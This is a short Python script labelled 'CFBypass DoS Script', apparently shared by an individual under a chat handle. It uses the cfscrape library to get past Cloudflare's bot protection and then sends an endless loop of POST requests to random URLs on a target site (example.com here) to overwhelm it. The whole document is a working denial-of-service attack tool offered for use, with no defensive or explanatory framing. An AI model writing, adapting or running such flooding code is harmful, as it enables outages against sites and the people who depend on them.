# cfscrape blocked/patched by cloudflare 12/6/2019
# pip install -U cfscrape
# CFBypass DoS Script
# SmallDoink#0666
import cfscrape
import random
s = cfscrape.create_scraper()
while 1:
    x = str(random.random())
    print s.post('https://example.com/'+x).headers

